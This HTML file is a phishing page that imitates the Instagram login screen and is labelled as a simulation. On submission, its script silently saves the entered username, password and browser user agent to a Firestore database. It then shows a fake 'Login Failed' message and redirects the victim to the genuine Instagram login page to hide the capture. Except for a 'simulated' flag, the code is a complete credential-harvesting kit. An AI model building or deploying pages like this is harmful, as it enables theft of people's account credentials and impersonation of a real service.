<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Social Platform Login Simulation</title>
    <!--
    This file simulates a stealthy phishing attack. 
    Data capture is silent and redirection is instant upon form submission.
    The database connection status and captured data logs have been removed for realism.
    -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #000000; 
        }
        .social-button {
            background: linear-gradient(to right, #405DE6, #5B51D8, #833AB4, #C13584, #E1306C, #FD1D1D);
        }
        /* Hidden loading indicator for stealth */
        #loadingSpinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #ffffff;
            border-radius: 50%;
            width: 1.5rem;
            height: 1.5rem;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-4">

    <!-- LOGIN CARD -->
    <div id="phishing-card" class="w-full max-w-sm bg-gray-900 p-10 rounded-xl border border-gray-700 shadow-xl mb-8">
        <div class="text-center mb-6">
            <h1 class="text-3xl font-serif font-bold italic text-white tracking-wide">
                Instagram
            </h1>
        </div>

        <form id="loginForm" onsubmit="simulatePhishing(event)" class="space-y-4">
            <div class="relative">
                <input id="username" name="username" type="text" required
                       class="w-full px-3 py-2.5 text-sm border border-gray-600 bg-gray-800 rounded-md focus:border-blue-500 placeholder-gray-400 text-white transition duration-150 ease-in-out"
                       placeholder="Phone number, username, or email">
            </div>

            <div class="relative">
                <input id="password" name="password" type="password" required
                       class="w-full px-3 py-2.5 text-sm border border-gray-600 bg-gray-800 rounded-md focus:border-blue-500 placeholder-gray-400 text-white transition duration-150 ease-in-out"
                       placeholder="Password">
            </div>

            <div>
                <button type="submit" id="loginButton"
                        class="social-button w-full flex justify-center py-1.5 px-4 rounded-md text-sm font-semibold text-white opacity-80 hover:opacity-100 transition duration-150 ease-in-out">
                    Log in
                </button>
            </div>
        </form>

        <div class="text-center mt-4">
            <a href="#" class="text-xs text-blue-400 font-medium hover:text-blue-500">
                Forgot password?
            </a>
        </div>

        <div class="flex items-center justify-between my-5">
            <div class="flex-grow border-t border-gray-700"></div>
            <span class="flex-shrink mx-4 text-gray-500 text-xs font-semibold">OR</span>
            <div class="flex-grow border-t border-gray-700"></div>
        </div>

        <div class="text-center">
            <a href="#" class="text-sm font-semibold text-blue-400 hover:text-blue-500 flex items-center justify-center">
                <svg class="h-5 w-5 mr-1" aria-hidden="true" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3V2z"/>
                </svg>
                Log in with Facebook
            </a>
        </div>
    </div>
    
    <!-- TOASTER MESSAGE BOX (Kept for educational feedback on success/failure) -->
    <div id="educationalMessage" class="hidden fixed top-4 left-1/2 transform -translate-x-1/2 px-6 py-3 text-sm font-medium text-yellow-800 bg-yellow-100 rounded-full shadow-2xl z-50" role="alert">
        <span class="font-bold">Login Failed:</span> Please check your username and password.
    </div>

    <!-- FIREBASE SETUP SCRIPT -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
        import { getFirestore, collection, addDoc, Timestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
        import { setLogLevel } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

        // Set Firebase Log Level to Error to minimize console noise, but keep error logs
        setLogLevel('Error');

        // Global variables provided by the environment
        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
        const firebaseConfig = JSON.parse(typeof __firebase_config !== 'undefined' ? __firebase_config : '{}');
        const initialAuthToken = typeof __initial_auth_token !== 'undefined' ? __initial_auth_token : null;

        let db, auth;
        let globalUserId = null;
        let isAuthReady = false;
        
        // UI elements
        const messageBox = document.getElementById('educationalMessage');
        const loginButton = document.getElementById('loginButton');

        // 1. Initialize Firebase and authenticate (must be silent)
        try {
            const app = initializeApp(firebaseConfig);
            db = getFirestore(app);
            auth = getAuth(app);
            
            onAuthStateChanged(auth, async (user) => {
                if (!user) {
                    try {
                        const userCredential = await signInAnonymously(auth);
                        globalUserId = userCredential.user.uid;
                        isAuthReady = true;
                    } catch (error) {
                        // Log auth failure internally, do not display to user
                        console.error("Firebase Auth Error: Failed anonymous sign-in.", error);
                    }
                } else {
                    globalUserId = user.uid;
                    isAuthReady = true;
                }
            });

            if (initialAuthToken) {
                signInWithCustomToken(auth, initialAuthToken).catch(error => {
                    console.error("Firebase Custom Auth Error:", error);
                });
            }
        } catch (error) {
            console.error("CRITICAL ERROR: Failed to initialize Firebase.", error);
        }

        /**
         * Simulates the phishing capture process:
         * 1. Captures user input.
         * 2. Silently saves data to the Firestore collection.
         * 3. Redirects the user to the legitimate site with a fake error message.
         */
        window.simulatePhishing = async (event) => {
            event.preventDefault();

            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            
            const username = usernameInput.value.trim();
            const password = passwordInput.value;

            // Temporarily disable button and show loading for realism
            const originalButtonContent = loginButton.innerHTML;
            loginButton.disabled = true;
            loginButton.innerHTML = '<div id="loadingSpinner" class="mx-auto"></div>';

            if (!username || !password) {
                loginButton.disabled = false;
                loginButton.innerHTML = originalButtonContent;
                return;
            }
            
            const capturedPayload = {
                user_id: globalUserId || 'unknown_user',
                username: username,
                password: password,
                timestamp: Timestamp.now(),
                device: navigator.userAgent,
                is_simulated_capture: true
            };

            // 1. SILENT DATA CAPTURE (Attacker's Server)
            if (isAuthReady && db) {
                const captureCollectionRef = collection(db, `artifacts/${appId}/public/data/simulated_credentials`);
                try {
                    await addDoc(captureCollectionRef, capturedPayload);
                    console.log("Stealth Capture SUCCESS: Credentials sent to database.");
                } catch (error) {
                    // CRITICAL: Fail silently, do NOT show this error to the user.
                    console.error("Stealth Capture FAILED (Permission Denied/Network Issue):", error);
                }
            } else {
                console.warn("Database was not ready. Capture skipped (simulated network failure).");
            }

            // 2. MALICIOUS STEP SIMULATION: Show generic error and redirect
            
            // Show fake error message (e.g., "Login Failed")
            messageBox.textContent = 'Login Failed: Please check your username and password.';
            messageBox.classList.remove('hidden', 'bg-red-100', 'text-red-800');
            messageBox.classList.add('bg-yellow-100', 'text-yellow-800');
            
            // Clear inputs for visual feedback (makes user re-type on real site)
            usernameInput.value = '';
            passwordInput.value = '';

            // Redirect after a short delay (simulates server processing time)
            const realTargetURL = 'https://www.instagram.com/accounts/login/?hl=en'; // Redirecting to Google as a stand-in for the real site
            setTimeout(() => {
                window.location.href = realTargetURL; 
            }, 1500); // 1.5 seconds delay

            // Note: The redirection prevents the button content from being restored.
        };
        
    </script>

</body>
</html>
